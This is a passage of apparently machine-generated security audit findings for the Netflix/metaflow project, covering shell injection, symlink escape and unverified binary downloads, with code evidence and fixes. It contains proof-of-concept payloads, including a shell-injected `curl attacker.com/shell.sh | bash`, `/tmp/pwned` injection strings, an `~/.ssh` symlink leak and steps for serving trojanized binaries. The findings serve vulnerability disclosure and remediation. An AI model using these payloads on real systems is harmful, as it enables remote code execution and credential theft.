non-trivial.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/argo/argo_workflows_cli.py:1207","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/argo/argo_workflows_cli.py:1207","metaflow/util.py:150-162","metaflow/metaflow_config.py:92","metaflow/plugins/argo/argo_workflows.py:526"],"finding_hash":"408fac5023d78ee361cee61fef354aba","found_at":"2026-04-18T18:34:03.348055Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":16,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m10","module_name":"The uv bootstrap script in `metaflow/plugins/uv/bootstrap.py` reads extension names from the INFO metadata file (part of the code package) via `read_info_file()`. These names are formatted into `--no-","module_type":"whitebox","finding_source":"archon","module_short":"uv-extension-injection","description":"Phase: 8\nSequence: 029\nSlug: uv-extension-name-injection\nVerdict: VALID\nRationale: Extension names from INFO file in code package flow unsanitized into shell=True f-string subprocess command; second-order injection requiring prior code package compromise but representing an independent CWE-78 defense-in-depth failure.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nThe uv bootstrap script in `metaflow/plugins/uv/bootstrap.py` reads extension names from the INFO metadata file (part of the code package) via `read_info_file()`. These names are formatted into `--no-install-package {dep}` shell command arguments and passed to `subprocess.run(cmd, shell=True)` without sanitization. If an attacker can replace the code package (via H-07/p8-026 tar_backend.py raw extractall), they can include an INFO file with shell metacharacters in extension names to achieve command injection during uv bootstrap.\n\n## Location\n\n- `metaflow/plugins/uv/bootstrap.py:86-89` -- `info[\"ext_info\"][0].keys()` extracts extension names\n- `metaflow/plugins/uv/bootstrap.py:110-111` -- `f\"--no-install-package {dep}\"` formatted into shell command\n- `metaflow/plugins/uv/bootstrap.py:112-116` -- f-string command passed to `run_cmd(cmd)` -\u003e `subprocess.run(cmd, shell=True)`\n\n## Attacker Control\n\nSecond-order: attacker must first compromise the code package on S3 (same precondition as H-07/p8-026). The INFO file within the code package contains extension names that flow into shell commands. Extension names in normal operation are clean Python package identifiers.\n\n## Trust Boundary Crossed\n\nS3 code package -\u003e INFO file extraction -\u003e extension names -\u003e shell command execution in container.\n\n## Impact\n\nArbitrary shell command execution in the container during uv bootstrap. Container IAM role provides access to S3, secrets, and network resources. This is a second-order amplifier of the code package compromise (H-07).\n\n## Evidence\n\n```python\n# uv/bootstrap.py:84-95\ndef skip_metaflow_dependencies():\n    skip_pkgs = [\"metaflow\"]\n    info = read_info_file()\n    if info is not None:\n        try:\n            skip_pkgs.extend([ext_name for ext_name in info[\"ext_info\"][0].keys()])\n            # ext_name from code package INFO file -- attacker controlled if package compromised\n\n# uv/bootstrap.py:109-116\nskip_pkgs = \" \".join(\n    [f\"--no-install-package {dep}\" for dep in skip_metaflow_dependencies()]\n)\ncmd = f\"\"\"set -e;\n    uv sync --frozen --no-dev {skip_pkgs};\n    uv pip install {dependencies} --strict\n    \"\"\"\nrun_cmd(cmd)  # subprocess.run(cmd, shell=True)\n```\n\nPayload: extension name `\"foo; curl attacker.com/shell.sh | bash #\"` yields:\n`uv sync --frozen --no-dev --no-install-package metaflow --no-install-package foo; curl attacker.com/shell.sh | bash #;`\n\n## Reproduction Steps\n\n1. Create a code package tar.gz containing an INFO file with a malicious extension name (e.g., `{\"ext_info\": [{\"foo; id \u003e /tmp/pwned #\": {}}]}`)\n2. Upload to the S3 code package path for a target flow using `@uv` decorator\n3. Trigger the flow run -- container bootstrap extracts code package and runs uv bootstrap\n4. Verify command injection via `/tmp/pwned`\n5. Recommended fix: use `shlex.quote(dep)` for all dynamic values in shell commands, or switch to `subprocess.run([...], shell=False)` with argument lists\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/uv/bootstrap.py:86-89","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/uv/bootstrap.py:86-89","metaflow/plugins/uv/bootstrap.py:110-111","metaflow/plugins/uv/bootstrap.py:112-116"],"finding_hash":"bc61e4028aee43729893419aed2b5f65","found_at":"2026-04-18T18:34:03.348054Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":14,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m8","module_name":"The `walk_without_cycles()` function in `metaflow/util.py` follows symlinks to prevent missing files in projects that use symlinked directories. The `seen` set prevents infinite loops from symlink cyc","module_type":"whitebox","finding_source":"archon","module_short":"walk-symlink-escape","description":"Phase: 8\nSequence: 027\nSlug: walk-without-cycles-symlink\nVerdict: VALID\nRationale: walk_without_cycles follows symlinks without root boundary check, enabling sensitive file contents (SSH keys, credentials) to be included in code packages uploaded to S3; cycle detection does not prevent root escape.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nThe `walk_without_cycles()` function in `metaflow/util.py` follows symlinks to prevent missing files in projects that use symlinked directories. The `seen` set prevents infinite loops from symlink cycles but does NOT check whether the symlink target is within the project root. A symlink in the project directory pointing to a sensitive filesystem location (e.g., `~/.ssh`, `/etc`) causes the target's contents to be included in the code package uploaded to S3, where they are accessible to anyone with S3 read access.\n\n## Location\n\n- `metaflow/util.py:629-663` -- `walk_without_cycles` function\n- `metaflow/util.py:640-656` -- symlink following without root boundary check\n- `metaflow/packaging_sys/utils.py:20` -- caller: code packaging\n- `metaflow/packaging_sys/v1.py:510` -- caller: user code tuples\n\n## Attacker Control\n\nAttacker must place a symlink in the flow project directory. This is achievable in:\n- CI/CD pipelines triggered by PRs (untrusted code submissions)\n- Shared development environments\n- Containerized build systems with mounted project directories\n\n## Trust Boundary Crossed\n\nLocal filesystem (outside project root) -\u003e code package -\u003e S3 datastore (accessible to other users/roles).\n\n## Impact\n\nInformation disclosure: sensitive file contents (SSH keys, cloud credentials, certificates, `/etc/passwd`, `.env` files) included in code packages uploaded to S3. In multi-tenant deployments, this exposes sensitive data to other users with S3 bucket access.\n\n## Evidence\n\n```python\n# util.py:629-663\ndef walk_without_cycles(top_root, exclude_dirs=None):\n    def _recurse(root, skip_dirs, seen):\n        for parent, dirs, files in os.walk(root):\n            dirs[:] = [d for d in dirs if d not in skip_dirs]\n            for d in dirs:\n                path = os.path.join(parent, d)\n                if os.path.islink(path):\n                    reallink = os.path.realpath(path)\n                    if reallink not in seen:\n                        # BUG: no check that reallink is within top_root\n                        recursive_seen = set().union(seen)\n                        recursive_seen.add(reallink)\n                        for x in _recurse(path, default_skip_dirs, recursive_seen):\n                            yield x\n            yield parent, dirs, files\n```\n\n## Reproduction Steps\n\n1. In a flow project directory, create a symlink: `ln -s ~/.ssh sensitive_link`\n2. Run a flow with `@pypi` or `@conda` decorator that triggers code packaging\n3. Inspect the uploaded code package tar.gz on S3\n4. Verify that the contents of `~/.ssh/` are included in the package\n5. Recommended fix: add a root boundary check before following symlinks: `if not os.path.realpath(path).startswith(os.path.realpath(top_root) + os.sep): continue`\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/util.py:629-663","repo_name":"Netflix/metaflow","matched_at":["metaflow/util.py:629-663","metaflow/util.py:640-656","metaflow/packaging_sys/utils.py:20","metaflow/packaging_sys/v1.py:510"],"finding_hash":"6cca1267b8e9983f0a669ff7304c9f60","found_at":"2026-04-18T18:34:03.348053Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":15,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m9","module_name":"The `_tar_filter` function in `metaflow/plugins/uv/bootstrap.py` filters tar members by checking only `os.path.basename(member.name) == \"uv\"`. It does not check `member.type`, `member.issym()`, or `me","module_type":"whitebox","finding_source":"archon","module_short":"uv-tar-filter-symlink","description":"Phase: 8\nSequence: 028\nSlug: uv-tar-filter-symlink\nVerdict: VALID\nRationale: uv _tar_filter checks basename only and does not inspect member type, allowing a SYMTYPE member named \"uv\" to pass the filter; exploitation requires GitHub release compromise which is a high bar, but the missing type check is a confirmed CWE-61 pattern.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: check-4-ambiguous (GitHub release compromise is non-standard attacker position)\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nThe `_tar_filter` function in `metaflow/plugins/uv/bootstrap.py` filters tar members by checking only `os.path.basename(member.name) == \"uv\"`. It does not check `member.type`, `member.issym()`, or `member.islnk()`. A tar archive from a compromised GitHub release containing a SYMTYPE member named `\"uv-x86_64-unknown-linux-gnu/uv\"` with a symlink target pointing to an attacker-chosen path would pass the filter. The symlink would be created at `uv_install_path/uv`, and subsequent `uv sync` calls would execute whatever the symlink points to.\n\n## Location\n\n- `metaflow/plugins/uv/bootstrap.py:53-57` -- `_tar_filter` function\n- `metaflow/plugins/uv/bootstrap.py:65` -- `tar.extractall(uv_install_path, filter=_tar_filter)`\n- `metaflow/plugins/uv/bootstrap.py:15` -- `UV_URL` version-pinned to 0.6.11\n\n## Attacker Control\n\nRequires compromise of GitHub release for `astral-sh/uv` version 0.6.11, or MITM/redirect of the GitHub release download URL. This is a high exploitation bar.\n\n## Trust Boundary Crossed\n\nGitHub releases (internet) -\u003e tar extraction -\u003e binary execution in container.\n\n## Impact\n\nArbitrary binary execution in place of uv during container bootstrap. The uv binary is used for Python environment management and has access to container IAM role and network resources.\n\n## Evidence\n\n```python\n# uv/bootstrap.py:53-57\ndef _tar_filter(member: tarfile.TarInfo, path):\n    if os.path.basename(member.name) != \"uv\":\n        return None  # skip\n    member.path = os.path.basename(member.path)\n    return member  # BUG: returns symlink members unchanged, no type check\n\n# uv/bootstrap.py:65\ntar.extractall(uv_install_path, filter=_tar_filter)\n```\n\n## Reproduction Steps\n\n1. Create a tar.gz with a SYMTYPE member named `\"uv-x86_64-unknown-linux-gnu/uv\"` pointing to `/tmp/trojan`\n2. Place a malicious executable at `/tmp/trojan` in the container\n3. Redirect the uv download URL to serve this tar\n4. Trigger a flow using `@uv` decorator\n5. Verify that `uv_install_path/uv` is a symlink and subsequent `uv sync` executes the trojan\n6. Recommended fix: add `if member.issym() or member.islnk(): return None` to `_tar_filter`; add checksum verification for the download\n","severity":"medium","confidence":"tentative","tags":["archon","phase-lite","valid","poc-pending"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/uv/bootstrap.py:53-57","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/uv/bootstrap.py:53-57","metaflow/plugins/uv/bootstrap.py:65","metaflow/plugins/uv/bootstrap.py:15"],"finding_hash":"ddadeeb34d0a0866e53257a5b0533b58","found_at":"2026-04-18T18:34:03.348053Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":13,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m7","module_name":"Micromamba is downloaded from CDN endpoints (`micro.mamba.pm` and `micromamba.outerbounds.sh`) without any integrity verification in two separate code paths. Path A (`bootstrap.py`) uses `tarfile.open","module_type":"whitebox","finding_source":"archon","module_short":"micromamba-no-integrity","description":"Phase: 8\nSequence: 023\nSlug: micromamba-no-integrity\nVerdict: VALID\nRationale: Micromamba binary downloaded from CDN without checksum or signature verification in two paths with version inconsistency (2.0.4 vs 1.5.7); version pinning reduces but does not eliminate supply-chain risk since CDN compromise can serve malicious content for any version.\nSeverity-Original: HIGH\nPoC-Status: theoretical\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nMicromamba is downloaded from CDN endpoints (`micro.mamba.pm` and `micromamba.outerbounds.sh`) without any integrity verification in two separate code paths. Path A (`bootstrap.py`) uses `tarfile.open()` with no member type check on a version-pinned (2.0.4) download. Path B (`micromamba.py`) uses a `curl | tar` shell pipe on a different version (1.5.7). Neither path verifies checksums or signatures. A CDN compromise could serve a trojanized binary. Additionally, Path A does not check the tar member type, allowing a SYMTYPE member named `\"bin/micromamba\"` to create a symlink instead of a binary.\n\n## Location\n\n- **Path A (container bootstrap)**:\n  - `metaflow/plugins/pypi/bootstrap.py:121` -- `MICROMAMBA_URL.format(platform=architecture, version=\"2.0.4\")`\n  - `metaflow/plugins/pypi/bootstrap.py:148-155` -- `tarfile.open()` -\u003e `tar.getmember(\"bin/micromamba\")` -\u003e `tar.extract(member, micromamba_dir)` -- no checksum, no member type check\n  - `metaflow/plugins/pypi/bootstrap.py:172` -- `os.chmod(micromamba_path, 0o755)`\n\n- **Path B (developer machine)**:\n  - `metaflow/plugins/pypi/micromamba.py:384` -- `MICROMAMBA_URL.format(platform=platform, version=\"1.5.7\")` -- different version!\n  - `metaflow/plugins/pypi/micromamba.py:394-395` -- `f\"curl -Ls {url} | tar -xvj -C {installation_location} bin/micromamba\"` with `shell=True`\n\n## Attacker Control\n\nCDN compromise of `micro.mamba.pm` or `micromamba.outerbounds.sh` mirror. The version pin means the attacker must serve malicious content for the specific pinned version, but CDN compromise grants this capability.\n\n## Trust Boundary Crossed\n\nInternet CDN -\u003e binary download -\u003e execution as bootstrap process with container IAM role.\n\n## Impact\n\nArbitrary code execution via trojanized micromamba binary. In Path A, a SYMTYPE tar member could create a symlink instead of a binary, enabling `os.chmod` to modify permissions on the symlink target. Container IAM role provides access to S3, secrets, and network resources.\n\n## Evidence\n\n```python\n# Path A: bootstrap.py:148-155 -- no checksum, no type check\nwith tarfile.open(fileobj=io.BytesIO(decompressor.decompress(response.read())), mode=\"r:\") as tar:\n    member = tar.getmember(\"bin/micromamba\")\n    tar.extract(member, micromamba_dir)  # no check of member.type\n\n# Path B: micromamba.py:394-395 -- shell pipe, no checksum\nresult = subprocess.Popen(\n    f\"curl -Ls {url} | tar -xvj -C {installation_location} bin/micromamba\",\n    shell=True, ...\n)\n\n# Version inconsistency: 2.0.4 (bootstrap.py:121) vs 1.5.7 (micromamba.py:384)\n```\n\n## Reproduction Steps\n\n1. Set up a proxy or DNS redirect for `micro.mamba.pm` to serve a trojanized tar archive\n2. The tar should contain a member named `\"bin/micromamba\"` with malicious content\n3. Trigger micromamba installation via `@pypi` or `@conda` decorator\n4. Verify the trojanized binary is extracted and executed\n5. For symlink variant: serve tar with SYMTYPE member named `\"bin/micromamba\"` pointing to a sensitive file, verify `os.chmod` modifies the symlink target\n6. Recommended fix: add SHA256 checksum verification for all binary downloads; verify tar member type before extraction; unify version between paths\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: No integrity verification on downloaded binary is a genuine supply-chain weakness; version inconsistency and missing tar type check in Path A are real issues; but exploitation requires CDN compromise.\nSeverity-Final: MEDIUM\nPoC-Status: theoretical\n\nIndependent code trace confirms both paths: Path A at bootstrap.py:148-155 (tarfile with no checksum, no type check), Path B at micromamba.py:394-395 (curl|tar with no checksum). Version mismatch (2.0.4 vs 1.5.7) confirmed. Severity downgraded from HIGH to MEDIUM because: (1) exploitation requires CDN compromise, (2) version pinning provides minor mitigation, (3) HTTPS provides transport security. Full review: `archon/adversarial-reviews/micromamba-no-integrity-review.md`.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite","valid","poc-theoretical"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/pypi/bootstrap.py:121","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/pypi/bootstrap.py:121","metaflow/plugins/pypi/bootstrap.py:148-155","metaflow/plugins/pypi/bootstrap.py:172","metaflow/plugins/pypi/micromamba.py:384","metaflow/plugins/pypi/micromamba.py:394-395"],"finding_hash":"5b84148d073b2e4050967f6c36c774f5","found_at":"2026-04-18T18:34:03.348052Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":11,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m5","module_name":"The `_install_micromamba()` function in `metaflow/plugins/pypi/micromamba.py` reads the `METAFLOW_TOKEN_HOME` or `METAFLOW_HOME` environment variable to determine the installation path for micromamba.","module_type":"whitebox","finding_source":"archon","module_short":"shell-injection-micromamba-envvar","description":"Phase: 8\nSequence: 021\nSlug: shell-injection-micromamba-envvar\nVerdict: VALID\nRationale: METAFLOW_TOKEN_HOME/METAFLOW_HOME env vars flow unsanitized into shell=True f-string subprocess call in micromamba.py; @secrets guard blocks one remote vector but does not prevent local/CI/CD env var manipulation.\nSeverity-Original: HIGH\nPoC-Status: theoretical\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nThe `_install_micromamba()` function in `metaflow/plugins/pypi/micromamba.py` reads the `METAFLOW_TOKEN_HOME` or `METAFLOW_HOME` environment variable to determine the installation path for micromamba. This path is embedded unsanitized into an f-string shell command (`curl -Ls {url} | tar -xvj -C {installation_location} bin/micromamba`) executed via `subprocess.Popen(shell=True)`. An attacker who can set these environment variables can inject arbitrary shell commands.\n\n## Location\n\n- `metaflow/plugins/pypi/micromamba.py:39-42` -- env var read\n- `metaflow/plugins/pypi/micromamba.py:43-46` -- path construction via `os.path.join(os.path.expanduser(_home), \"micromamba\")`\n- `metaflow/plugins/pypi/micromamba.py:380` -- `_install_micromamba(installation_location)`\n- `metaflow/plugins/pypi/micromamba.py:394-395` -- `f\"curl -Ls {url} | tar -xvj -C {installation_location} bin/micromamba\"` with `shell=True`\n\n## Attacker Control\n\nEnvironment variables `METAFLOW_TOKEN_HOME` and `METAFLOW_HOME` can be set by:\n- Container orchestration configuration (Kubernetes env, Batch job definition)\n- CI/CD pipeline environment variables\n- Local attacker with shell access\n- Note: `@secrets` decorator blocks `METAFLOW_*` prefixed env vars from remote injection, reducing one attack vector\n\n## Trust Boundary Crossed\n\nEnvironment variable (semi-trusted) -\u003e shell command execution on developer machine or container.\n\n## Impact\n\nArbitrary shell command execution on the machine where micromamba is being installed. On developer machines, this runs with the developer's full privileges including access to credentials, SSH keys, and cloud configurations. In containers, runs with container IAM role.\n\n## Evidence\n\n```python\n# micromamba.py:38-46\nif os.environ.get(\"METAFLOW_TOKEN_HOME\"):\n    _home = os.environ.get(\"METAFLOW_TOKEN_HOME\")\nelse:\n    _home = os.environ.get(\"METAFLOW_HOME\", \"~/.metaflowconfig\")\nself._path_to_hidden_micromamba = os.path.join(\n    os.path.expanduser(_home),\n    \"micromamba\",\n)\n\n# micromamba.py:394-395\nresult = subprocess.Popen(\n    f\"curl -Ls {url} | tar -xvj -C {installation_location} bin/micromamba\",\n    shell=True,\n    ...\n)\n```\n\nPoC payload: `METAFLOW_TOKEN_HOME='/tmp/x; id \u003e /tmp/pwned #'`\n\n## Reproduction Steps\n\n1. Set `METAFLOW_TOKEN_HOME=\"/tmp/x; id \u003e /tmp/pwned #\"` in the environment\n2. Trigger a flow that uses `@pypi` or `@conda` decorator requiring micromamba installation\n3. Observe that the injected command executes during `_install_micromamba()`\n4. Verify command output at `/tmp/pwned`\n5. Recommended fix: use `shlex.quote(installation_location)` or switch to `subprocess.run([...], shell=False)` with proper argument list; validate env var values against expected path patterns\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: Shell injection via unsanitized env var in shell=True subprocess is real, but practical exploitation requires env var control which limits severity.\nSeverity-Final: MEDIUM\nPoC-Status: theoretical\n\nIndependent code trace confirms: `METAFLOW_TOKEN_HOME` flows from env var read (line 39) through `os.path.join`/`os.path.expanduser` (no sanitization) to `subprocess.Popen(f\"...\", shell=True)` at line 394. No `shlex.quote` or input validation exists. However, severity downgraded from HIGH to MEDIUM because: (1) requires attacker control of environment variables, (2) `@secrets` blocks the primary remote vector, (3) `os.makedirs` at line 386 may fail on some payloads before reaching the shell command. Full review: `archon/adversarial-reviews/shell-injection-micromamba-envvar-review.md`.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite","valid","poc-theoretical"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/pypi/micromamba.py:39-42","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/pypi/micromamba.py:39-42","metaflow/plugins/pypi/micromamba.py:43-46","metaflow/plugins/pypi/micromamba.py:380","metaflow/plugins/pypi/micromamba.py:394-395"],"finding_hash":"d4cea1b8d893a4bf7fb4cf9b4273e5c0","found_at":"2026-04-18T18:34:03.348051Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":12,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m6","module_name":"The fast-initializer binary is downloaded from a floating `latest` URL (`https://fast-flow-init.outerbounds.sh/{platform}/latest`) with no integrity verification -- no checksum, no signature, no hash ","module_type":"whitebox","finding_source":"archon","module_short":"fast-initializer-no-integrity","description":"Phase: 8\nSequence: 022\nSlug: fast-initializer-no-integrity\nVerdict: VALID\nRationale: Floating latest URL with no checksum/signature downloads and executes an untrusted binary that receives S3 datastore root as stdin; HTTPS is transport-only and provides no content integrity; default-off reduces exposure but enabled deployments are at critical risk.\nSeverity-Original: HIGH\nPoC-Status: theoretical\nPre-FP-Flag: none\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nThe fast-initializer binary is downloaded from a floating `latest` URL (`https://fast-flow-init.outerbounds.sh/{platform}/latest`) with no integrity verification -- no checksum, no signature, no hash comparison, no version pin. The downloaded binary is made executable and run via `subprocess.run(cmd, shell=True)`, receiving the full S3 datastore root URL and all package paths as stdin. A CDN compromise, DNS hijack, or origin server compromise would serve a trojanized binary to every Metaflow container with `CONDA_USE_FAST_INIT=True`. The trojanized binary would receive full S3 deployment credentials and paths.\n\nThis finding consolidates probe hypotheses PH-03 (no integrity), PH-10 (HTTPS insufficient), and PH-14 (S3 root to stdin).\n\n## Location\n\n- `metaflow/plugins/pypi/bootstrap.py:24` -- `FAST_INIT_BIN_URL = \"https://fast-flow-init.outerbounds.sh/{platform}/latest\"` (floating latest)\n- `metaflow/plugins/pypi/bootstrap.py:87-91` -- `urlopen(req)` -\u003e `gz.read()` -\u003e `f.write(...)` (no integrity check)\n- `metaflow/plugins/pypi/bootstrap.py:103` -- `os.chmod(fast_initializer_path, 0o755)` (made executable)\n- `metaflow/plugins/pypi/bootstrap.py:320-325` -- S3 datastore root URLs assembled as stdin\n- `metaflow/plugins/pypi/bootstrap.py:329-330` -- `run_cmd(cmd, all_package_urls)` executes binary with S3 URLs\n\n## Attacker Control\n\nNetwork attacker: CDN compromise, DNS hijack of `fast-flow-init.outerbounds.sh`, origin server compromise, or MITM on HTTPS connection (via compromised CA or certificate misissue).\n\n## Trust Boundary Crossed\n\nInternet (CDN/DNS) -\u003e binary download -\u003e execution with S3 credentials and datastore root access.\n\n## Impact\n\n- **Immediate**: Arbitrary code execution in every Metaflow container with `CONDA_USE_FAST_INIT=True`\n- **Compound (PH-14)**: Trojanized binary receives S3 datastore root URL as stdin, enabling full read/write access to all Metaflow artifacts, code packages, and metadata\n- **Cascading**: S3 access enables poisoning of pickle artifacts (DFD-1 RCE in downstream steps), code package replacement (persistent compromise), and credential exfiltration\n- **Scope**: Single CDN compromise affects ALL enabled deployments simultaneously\n\nConditional: `CONDA_USE_FAST_INIT` defaults to `False`. Only explicitly enabled deployments are affected.\n\n## Evidence\n\n```python\n# bootstrap.py:24\nFAST_INIT_BIN_URL = \"https://fast-flow-init.outerbounds.sh/{platform}/latest\"\n\n# bootstrap.py:87-91 -- no checksum, no signature\nreq = Request(url, headers=headers)\nwith urlopen(req) as response:\n    with gzip.GzipFile(fileobj=response) as gz:\n        with open(fast_initializer_path, \"wb\") as f:\n            f.write(gz.read())\n\n# bootstrap.py:320-325 -- S3 root URLs as stdin to binary\nall_package_urls = \"\"\nfor url in conda_pkg_urls:\n    all_package_urls += f\"{storage.datastore_root}/{url}\\n\"\n\n# bootstrap.py:329-330\ncmd = f\"fast-initializer --prefix {prefix} --packages-dir {pkgs_dir}\"\nrun_cmd(cmd, all_package_urls)\n```\n\n## Reproduction Steps\n\n1. Confirm `CONDA_USE_FAST_INIT=True` in deployment configuration\n2. Set up a DNS redirect or proxy for `fast-flow-init.outerbounds.sh` to serve a trojanized binary\n3. Trigger a flow using `@pypi` or `@conda` decorator that invokes the bootstrap sequence\n4. Observe the trojanized binary executes with S3 URLs as stdin\n5. Verify the binary can read/write S3 artifacts using the container IAM role\n6. Recommended fix: Pin a specific version with SHA256 checksum verification; add signature verification; remove floating `latest` URL pattern\n\n## Cold Verification\n\nAdversarial-Verdict: CONFIRMED\nAdversarial-Rationale: No integrity verification on downloaded binary is a genuine supply-chain weakness, but exploitation requires CDN compromise and non-default configuration.\nSeverity-Final: MEDIUM\nPoC-Status: theoretical\n\nIndependent code trace confirms: floating `latest` URL at line 24, download with no checksum/signature at lines 87-91, chmod 755 at line 103, execution with S3 URLs as stdin at lines 329-330. Severity downgraded from HIGH to MEDIUM because: (1) `CONDA_USE_FAST_INIT` defaults to `False`, (2) exploitation requires CDN/DNS compromise which is a high-bar precondition, (3) HTTPS provides reasonable transport security against casual attackers. Full review: `archon/adversarial-reviews/fast-initializer-no-integrity-review.md`.\n","severity":"high","confidence":"tentative","tags":["archon","phase-lite","valid","poc-theoretical"],"status":"open","cvss_score":0,"source_file":"metaflow/plugins/pypi/bootstrap.py:24","repo_name":"Netflix/metaflow","matched_at":["metaflow/plugins/pypi/bootstrap.py:24","metaflow/plugins/pypi/bootstrap.py:87-91","metaflow/plugins/pypi/bootstrap.py:103","metaflow/plugins/pypi/bootstrap.py:320-325","metaflow/plugins/pypi/bootstrap.py:329-330"],"finding_hash":"917a77683bb76364389c86050a54f689","found_at":"2026-04-18T18:34:03.348051Z","created_at":"2026-04-18T18:34:03Z"}},{"type":"finding","data":{"id":10,"project_uuid":"00000000-0000-0000-0000-000000000001","http_record_uuids":[],"agent_run_uuid":"d59724a0-63a0-4086-9edf-b823fd5a94aa","module_id":"archon:m4","module_name":"The `id_` parameter in `metaflow/plugins/pypi/bootstrap.py` is read from `sys.argv[2]` (line 337) and flows unsanitized through `os.path.join` into f-string shell commands executed via `subprocess.run","module_type":"whitebox","finding_source":"archon","module_short":"shell-injection-bootstrap-id","description":"Phase: 8\nSequence: 020\nSlug: shell-injection-bootstrap-id\nVerdict: VALID\nRationale: Structural CWE-78 gap where sys.argv[2] flows unsanitized into shell=True subprocess; hex hash input prevents practical exploitation in normal operation but future code changes or non-standard callers could introduce exploitable values.\nSeverity-Original: MEDIUM\nPoC-Status: pending\nPre-FP-Flag: check-1-ambiguous (attacker control limited to hex hash in practice)\nDebate: archon/chamber-workspace/chamber-02/debate.md\n\n## Summary\n\nThe `id_` parameter in `metaflow/plugins/pypi/bootstrap.py` is read from `sys.argv[2]` (line 337) and flows unsanitized through `os.path.join` into f-string shell commands executed via `subprocess.run(cmd, shell=True)`. No `shlex.quote()` or input validation is applied. While the value is typically a hex hash (alphanumeric-safe) in normal Metaflow operation, the structural vulnerability means any non-standard caller or future code change that passes metacharacters would achieve shell command injection.\n\n## Location\n\n- `metaflow/plugins/pypi/bootstrap.py:337` -- `_, flow_name, id_, datastore_type = sys.argv`\n- `metaflow/plugins/pypi/bootstrap.py:352` -- `prefix = os.path.join(os.getcwd(), architecture, id_)`\n- `metaflow/plugins/pypi/bootstrap.py:227-242` -- `create_conda_environment(prefix, ...)` embeds `{prefix}` in f-string\n- `metaflow/plugins/pypi/bootstrap.py:245-256` -- `install_pypi_packages(prefix, ...)` same pattern\n- `metaflow/plugins/pypi/bootstrap.py:329` -- `fast_setup_environment` same pattern\n- `metaflow/plugins/pypi/bootstrap.py:42-55` -- `run_cmd(cmd)` calls `subprocess.run(cmd, shell=True)`\n\n## Attacker Control\n\n`id_` originates from `sys.argv[2]`. In normal operation, this is a hex hash of the conda/pypi environment specification, generated by `CondaEnvironment`. An attacker would need to influence the hash computation or find a caller that passes non-hex values. Currently no confirmed path to inject metacharacters.\n\n## Trust Boundary Crossed\n\nCommand-line argument -\u003e shell command execution in container bootstrap process.\n\n## Impact\n\nIf exploitable, arbitrary shell command execution in the container bootstrap process with container IAM role privileges (AWS Batch, Kubernetes). Container has access to S3 artifacts, secrets, and network resources.\n\n## Evidence\n\n```python\n# bootstrap.py:337\n_, flow_name, id_, datastore_type = sys.argv\n\n# bootstrap.py:352\nprefix = os.path.join(os.getcwd(), architecture, id_)\n\n# bootstrap.py:227-241 (create_conda_environment)\ncmd = f'''set -e;\n    ...\n    micromamba create --yes --offline --no-deps \\\n        --safety-checks=disabled --no-extra-safety-checks \\\n        --prefix {prefix} --file \"$tmpfile\" \\\n        ...'''\nrun_cmd(cmd)  # subprocess.run(cmd, shell=True)\n```\n\n## Reproduction Steps\n\n1. Identify the calling code that constructs the bootstrap command line (in `metaflow_environment.py`)\n2. Trace how `id_` is generated -- confirm it is always a hex hash\n3. Attempt to craft a flow with package specifications that produce a non-alphanumeric hash\n4. If successful, verify shell metacharacters in `id_` achieve command injection via the f-string\n5. Recommended fix: apply `shlex.quote(prefix)` in all f-string shell command constructions, or switch to `subprocess.run([...], shell=False)` with argument 